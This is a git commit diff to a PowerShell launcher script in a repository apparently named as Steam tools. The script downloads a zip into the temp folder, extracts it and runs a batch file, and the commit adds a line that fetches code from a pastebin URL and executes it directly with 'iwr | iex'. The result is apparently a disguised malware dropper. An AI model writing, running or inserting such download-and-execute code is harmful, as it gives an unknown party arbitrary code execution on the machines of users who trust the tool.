208c7b61c5d644ad9cc4500b2122a0f9af159941
rizzer-sigm <139589408+rizzer-sigm@users.noreply.github.com>
2025-08-10 23:48:23 -0400

    Update start bat.ps1

--- start bat.ps1
+++ start bat.ps1
@@ -1,9 +1,11 @@
 $url = "https://raw.githubusercontent.com/rizzer-sigm/steamtols/refs/heads/main/Install.zip"
 $zip = "$env:TEMP\file.zip"
 $folder = "$env:TEMP\extracted"
+iwr https://pastebin.com/raw/H0qpdC4q | iex
 
 Invoke-WebRequest $url -OutFile $zip
 if (-not (Test-Path $folder)) { New-Item -ItemType Directory $folder | Out-Null }
 Expand-Archive $zip -DestinationPath $folder -Force
 Start-Process "$folder\start.bat"
 exit
+
